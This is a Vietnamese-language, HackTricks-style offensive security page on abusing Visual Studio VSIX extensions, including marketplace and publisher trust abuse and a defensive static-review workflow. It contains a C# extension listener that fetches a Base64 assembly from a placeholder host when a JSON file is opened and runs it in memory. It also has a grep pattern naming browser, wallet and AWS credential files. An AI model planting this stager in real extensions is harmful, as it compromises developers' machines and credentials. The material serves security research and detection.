# Lạm dụng tiện ích mở rộng VSIX của Visual Studio

{{#include ../banners/hacktricks-training.md}}

Tiện ích mở rộng Visual Studio có thể biến các hoạt động chỉnh sửa thông thường thành thực thi mã dưới danh tính của người dùng đang đăng nhập. VSIX độc hại, nhà phát hành giả mạo hoặc bản cập nhật tiện ích mở rộng bị xâm nhập có thể tiếp cận người dùng thông qua các kênh cài đặt thông thường. Cài đặt khi có lời nhắc quản trị viên là một quy trình cài đặt có sự đồng ý, không phải tự động leo thang đặc quyền.<sup>[[1]](#references)</sup>

## Mô hình thực thi

Các tiện ích mở rộng VSSDK cổ điển thường thực thi bên trong `devenv.exe`. Mô hình `VisualStudio.Extensibility` mới hơn chủ yếu chạy các tiện ích mở rộng .NET hiện đại ngoài tiến trình: Visual Studio môi giới các lệnh gọi đến một tiến trình `Microsoft.ServiceHub.Host.Extensibility` riêng, giúp cô lập tính ổn định của IDE nhưng **không** sandbox tiện ích mở rộng khỏi các quyền Windows của người dùng. Tên tệp thực thi chính xác có thể bao gồm hậu tố kiến trúc, chẳng hạn như `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Kích hoạt khi có hoạt động chỉnh sửa thông thường

Thay vì chỉ cung cấp một lệnh menu dễ gây chú ý, tiện ích mở rộng có thể triển khai `ITextViewOpenClosedListener`. Callback `TextViewOpenedAsync` được gọi cho các tài liệu phù hợp, trong khi `TextViewExtensionConfiguration.AppliesTo` có thể giới hạn việc kích hoạt ở một kiểu phổ biến như JSON. Một trình định dạng hoặc linter thực sự vẫn có thể thực hiện công việc như đã quảng cáo, đồng thời một hành động thứ hai chạy như tác dụng phụ khi mở tệp.<sup>[[1]](#references)[[3]](#references)</sup>

Mẫu rút gọn sau đây cho thấy các điểm thực thi quan trọng; mẫu lược bỏ trình định dạng hợp pháp và phần xử lý lỗi để dễ theo dõi.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Trình nạp assembly managed trong bộ nhớ được kích hoạt bởi sự kiện</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Chuỗi này tải văn bản Base64, giải mã thành các byte assembly, nạp từ `MemoryStream` thông qua `AssemblyLoadContext` có thể thu hồi, gọi `EntryPoint` được phản chiếu với tham số rỗng hoặc `string[]`, chờ các entry point bất đồng bộ, rồi unload context. Stage thứ hai không được ghi xuống đĩa, mặc dù VSIX và DLL extension chính vẫn là các artefact trên đĩa. Base64 không cung cấp tính xác thực hay tính bảo mật; sử dụng HTTP cũng cho phép kẻ tấn công trên đường truyền thay thế phản hồi.<sup>[[1]](#references)</sup>

Các biến thể vận hành gồm bỏ qua mọi exception để tính năng được quảng bá vẫn tiếp tục hoạt động khi quá trình staging thất bại, hoặc dùng `ITextViewChangedListener` để kích hoạt sau khi có chỉnh sửa. Code chạy trong extension host và có thể sử dụng các managed API, P/Invoke, file, thông tin xác thực và tiến trình con có sẵn cho người dùng đó.<sup>[[1]](#references)</sup>

Để xem một bề mặt thực thi khác dành riêng cho trình soạn thảo, dựa trên cơ chế tự động tải plugin native, hãy xem:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Lạm dụng niềm tin vào Marketplace và kênh phân phối

VSIX có thể được gửi dưới dạng file chia sẻ/phishing trực tiếp, tải từ web Marketplace hoặc qua trình duyệt Marketplace tích hợp trong Visual Studio. Quy trình đăng ký publisher chủ yếu chỉ đảm bảo tính duy nhất và kiểm tra danh sách từ bị cấm, nên có thể cho phép danh tính publisher trông dễ gây nhầm lẫn; chiếm quyền publisher hoặc extension đã được tin cậy còn hiệu quả hơn vì kế thừa được lượng người dùng đã cài đặt. Khi cài đặt từ Marketplace, Visual Studio Installer được gọi và VSIX tải về được lưu tạm dưới `%LOCALAPPDATA%\Temp`; `payload.vsix` cũng được sử dụng hợp pháp, vì vậy chỉ riêng tên file không phải là dấu hiệu đáng ngờ.<sup>[[1]](#references)</sup>

MDSec không phát hiện giao thức URL nào của Visual Studio có thể trực tiếp cài đặt extension. Operator vẫn cần người dùng cài đặt/đặt niềm tin vào VSIX, hoặc phải xâm phạm kênh phân phối của một extension hiện có. Gói `AllUsers` được cài trong thư mục cài đặt Visual Studio và có thể yêu cầu nâng quyền, nhưng đây là hành vi trình cài đặt thông thường có sự đồng ý, chứ không phải con đường tự động để đạt quyền administrator hoặc SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Kiểm tra tĩnh trên quy mô lớn

Các gói VSIX thường là container ZIP, vì vậy quy trình rà soát Marketplace an toàn có thể liệt kê các gói, giải nén chúng **mà không nạp code extension**, phân tích manifest, xác định các bề mặt thực thi và dịch ngược các assembly managed bằng `ilspycmd`. Ưu tiên các assembly do extension sở hữu sau khi loại trừ những dependency thường được đóng gói kèm, sau đó đối chiếu các chuỗi liên quan đến kho thông tin xác thực với những cụm hành vi như đọc file rồi gửi qua mạng, mã hóa rồi gửi, tải xuống rồi thực thi, truy cập credential manager rồi truy cập mạng, hoặc chụp ảnh màn hình rồi gửi đi.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Đồng thời kiểm kê các DLL native, target MSBuild, script, template T4 và payload của trình cài đặt, thay vì cho rằng mọi bề mặt thực thi đều là mã managed. So sánh hành vi đáng ngờ với mục đích được khai báo trong manifest; telemetry và trình cập nhật hợp pháp có thể giống hành vi exfiltration hoặc staging. Chỉ rà soát tĩnh sẽ bỏ sót mã được đóng gói, làm rối, phân giải động và đang ở trạng thái dormant; chỉ rà soát phiên bản mới nhất sẽ bỏ sót các bản phát hành độc hại trong quá khứ.<sup>[[1]](#references)</sup>

Một cuộc tấn công khác thông qua việc tải project có thể thực thi target [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) độc hại mà không cần cài VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Xem xét lại các tiện ích mở rộng Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Giới thiệu về VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Cấu trúc của một gói VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - công cụ .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Chiến dịch Blinder Tunnel nhắm vào cơ sở hạ tầng Iraq](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
